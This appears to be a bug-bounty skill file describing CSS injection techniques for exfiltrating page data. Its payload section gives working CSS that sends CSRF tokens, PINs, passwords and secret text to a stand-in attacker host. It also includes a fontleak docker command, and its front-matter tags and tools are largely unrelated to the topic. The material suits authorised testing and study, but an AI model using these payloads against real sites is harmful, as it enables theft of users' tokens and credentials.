---
name: "css-injection"
version: "2.0"
category: "api"
subcategory: "injection"
phase: "exploitation"
tags: ["api", "blind-css", "bug-bounty", "csp-bypass", "css-injection", "exfiltration", "injection", "access-control", "account-takeover", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["adb", "burp", "ghauri", "sqlmap", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["html-injection", "csrf", "xss", "csp-bypass", "information-disclosure-harvesting"]
description: "Bug bounty skill: css injection - exploitation phase, api category"
---
# CSS Injection

## Summary

CSS Injection allows an attacker to inject untrusted CSS into a web page, enabling data exfiltration of CSRF tokens, secrets, and page content by manipulating layout and triggering network requests based on element attributes. CSS is particularly valuable because it is often permitted by CSP while JavaScript is blocked.

## Key Concepts

- **CSS selectors with attribute matching**: Use `[value^=a]`, `[value$=a]`, `[value*=a]` to brute-force token values character by character
- **Blind CSS exfiltration**: Use `@import` rules to trigger callbacks without JavaScript
- **Font-face oracle**: Use `@font-face` with `unicode-range` to detect character presence
- **Ligature attack**: Custom fonts detect text content through layout width changes
- **`attr()` extraction**: Modern `attr()` in CSS reads attribute values directly

## Technical Details

### Data Exfiltration via CSS Selectors

CSS selectors can match element attributes and trigger background-image requests when a condition is true. The attack brute-forces a token character by character, typically requiring an iframe to reload the page with updated payloads.

**Hidden inputs** cannot have background images applied directly. Use a sibling selector (`+` or `~`) to style a visible element after the hidden input.

**`:has()` selector** allows styling a parent element based on its children, enabling more flexible exfiltration.

### Blind CSS Exfiltration via @import

`@import` rules enable stylesheet chaining. The browser processes imports and applies new styles, allowing sequential extraction without page reload.

**Sequential Import Chaining (SIC)**: The attacker injects an initial `@import` pointing to a staging payload. The staging payload holds the connection open (long-polling) while generating the next specific payload. When a CSS rule matches, the browser makes a request, and the server detects it to generate the next `@import` in the chain.

### CSS Conditionals (Inline Style Exfiltration)

CSS conditionals (`if()`) combined with variables enable logic directly within a `style` attribute. This can extract attribute values by checking them against known values and triggering URL requests.

### Font-Face Character Oracle

`@font-face` with `unicode-range` loads a custom font only when specific characters are present in the text. The browser fetches the font URL if the character exists.

**Limitations**: Cannot distinguish repeated characters (e.g., "AA" triggers the font request once) and does not determine character order.

### Attribute Extraction via attr()

Modern `attr()` in `image-set()` can extract attribute values directly. When the stylesheet is cross-domain, relative URLs in `attr()` resolve against the stylesheet's origin, not the page's origin.

### Ligature Detection

Custom fonts with ligatures (combined glyphs for character sequences) can detect specific text content. A ligature with a huge width changes the element's layout, detectable via media queries or scrollbars.

## Methodology

### Character-by-Character Brute Force

1. Determine the injection point and whether CSS is rendered
2. Inject a selector matching the target element's attribute (e.g., `input[name="csrf-token"]`)
3. Use prefix selectors (`[value^="a"]`) to guess the first character
4. If a background image request is received, the character is correct
5. Update payload to guess the next character (e.g., `[value^="ab"]`)
6. Use an iframe to reload the page with each new payload iteration

### Optimization

- Concurrent prefix and suffix guessing: assign prefix check to `background` and suffix check to `border-image` or `list-style-image`
- Use `@import` chaining (SIC) for server-driven extraction without page reloads
- Use `:has()` to extract values from parent elements

## Exploitation Payloads

### Prefix Attribute Selector (Background Image Exfiltration)

```css
input[value^="TOKEN_012"] {
  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);
}

input[name="pin"][value="1234"] {
  background: url(https://attacker.example.com/log?pin=1234);
}
```

### Hidden Input via Sibling Selector

```css
input[name="csrf-token"][value^="a"] + input {
  background: url(https://attacker.example.com/?q=a)
}
```

### Has Selector Extraction

```css
div:has(input[value="1337"]) {
  background:url(/collectData?value=1337);
}
```

### Blind CSS Exfiltration via @import

```css
<style>@import url(http://attacker.example.com/staging?len=32);</style>
<style>@import'//attacker.example.com'</style>
```

### CSS Conditional Inline Extraction

```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```

### Font-Face Character Detection

```css
<style>
@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); unicode-range:U+0041; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); unicode-range:U+0042; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); unicode-range:U+0043; }
#sensitive-information{ font-family:poc; }
</style>
```

### Attribute Extraction via attr() + image-set()

```css
input[name="password"] {
  background: image-set(attr(value))
}
```

### Fontleak Ligature Attack

```css
<style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
```

## Tools

- **hackvertor/blind-css-exfiltration** - Blind CSS exfiltration tool
- **PortSwigger/css-exfiltration** - Collection of CSS exfiltration techniques
- **cgvwzq/css-scrollbar-attack** - Text node leakage via CSS injection using scrollbars
- **d0nutptr/sic** - Sequential Import Chaining for advanced CSS exfiltration
- **adrgs/fontleak** - Fast exfiltration of text using CSS and ligatures

## Not a Finding If

- CSS cannot be injected into a `style` tag or `style` attribute
- The application properly sanitizes CSS input and restricts `@import` to whitelisted origins
- CSP `style-src` directive prevents loading external stylesheets
- No sensitive data is present in element attributes or text content reachable by CSS selectors

## Notes

- Chrome classified the `unicode-range` oracle as "WontFix" (issue #40083029)
- The `attr()` technique works cross-origin because relative URLs in external stylesheets resolve against the stylesheet's origin
- An iframe is typically required to reload the page with updated brute-force payloads
- Fontleak: `docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest`

## References

- https://portswigger.net/research/blind-css-exfiltration
- https://www.xn--h1ari7b.com/css-injection/
- https://github.com/hackvertor/blind-css-exfiltration
- https://github.com/PortSwigger/css-exfiltration
- https://github.com/cgvwzq/css-scrollbar-attack
- https://github.com/d0nutptr/sic
- https://github.com/adrgs/fontleak
